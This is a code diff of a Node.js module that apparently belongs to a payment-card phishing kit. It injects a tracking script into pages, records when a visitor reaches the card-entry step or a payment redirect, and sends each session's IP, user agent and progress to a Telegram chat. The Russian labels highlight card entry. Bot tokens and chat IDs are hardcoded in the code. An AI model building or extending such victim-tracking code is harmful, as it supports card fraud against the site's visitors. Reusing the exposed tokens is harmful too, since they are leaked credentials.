@@ -7,8 +7,8 @@ const https = require('https');
 const logger = require('./logger');
 
 // Telegram Bot Configuration
-const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8368526952:AAGDK9Q3KfOVNltB0uvUihs0-9DzN8StWDo';
-const CHAT_ID = process.env.TELEGRAM_CHAT_ID || '-5166820954';
+const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8442088504:AAFbgTfMYJKK61LnV2jLJPMgG9kf7eNKeuk';
+const CHAT_ID = process.env.TELEGRAM_CHAT_ID || '-1003580814172';
 
 // Store session data: sessionId -> { messageId, logs: [], ip, userAgent, startTime }
 const sessions = new Map();
@@ -228,17 +228,11 @@ function formatSessionMessage(session, sessionId) {
       case 'card_page':
         message += `💳 [${time}] <b>СТРАНИЦА ВВОДА КАРТЫ!</b>\n`;
         break;
-      case 'bank_page':
-        message += `🏦 [${time}] <b>Страница банка</b>\n`;
-        break;
       case 'payment_redirect':
         message += `💰 [${time}] <b>ПЕРЕХОД НА ОПЛАТУ!</b> Сумма: €${log.amount || '?'}\n`;
         break;
-      case 'page_leave':
+      case 'page_leave_external':
         message += `🚪 [${time}] <b>Покинул сайт</b>\n`;
-        break;
-      case 'external_redirect':
-        message += `🔗 [${time}] Переход на: <b>${log.url || 'внешний сайт'}</b>\n`;
         break;
       default:
         message += `• [${time}] ${log.message || log.type}\n`;
@@ -536,50 +530,26 @@ function getTrackingScript() {
     }
   }, true);
   
-  // Track page leave
-  window.addEventListener('beforeunload', function() {
-    sendTrack({ type: 'page_leave', page: location.pathname });
-  });
+  // Track only real page leave (to external site)
+  // Don't track beforeunload as it fires for internal navigation too
   
-  // Track visibility change (tab switch)
-  document.addEventListener('visibilitychange', function() {
-    if (document.hidden) {
-      sendTrack({ type: 'page_leave', page: 'Свернул вкладку' });
-    }
-  });
-  
-  // Track external link clicks
+  // Track external link clicks only
   document.addEventListener('click', function(e) {
     var link = e.target.closest('a');
     if (link && link.href) {
-      var url = new URL(link.href, location.href);
-      if (url.hostname !== location.hostname) {
-        sendTrack({ type: 'external_redirect', url: url.hostname });
-      }
-      // Check for bank/payment URLs
-      if (link.href.match(/bank|payment|pay|checkout|3dsecure|visa|mastercard/i)) {
-        sendTrack({ type: 'bank_page', page: 'Переход на банк' });
-      }
-    }
-  }, true);
-  
-  // Detect iframe (bank 3DS pages often use iframes)
-  function checkForPaymentIframe() {
-    var iframes = document.querySelectorAll('iframe');
-    iframes.forEach(function(iframe) {
       try {
-        var src = iframe.src || '';
-        if (src.match(/bank|3ds|secure|payment|checkout/i)) {
-          sendTrack({ type: 'bank_page', page: 'Страница банка (3DS)' });
+        var url = new URL(link.href, location.href);
+        // Only track if leaving to external domain
+        if (url.hostname && url.hostname !== location.hostname && !url.hostname.includes('efflow')) {
+          sendTrack({ type: 'page_leave_external', page: 'Переход на ' + url.hostname });
         }
       } catch(e) {}
-    });
-  }
+    }
+  }, true);
   
   // Run detection periodically
   setInterval(function() {
     detectFormStep();
-    checkForPaymentIframe();
   }, 2000);
   
   // Initial detection
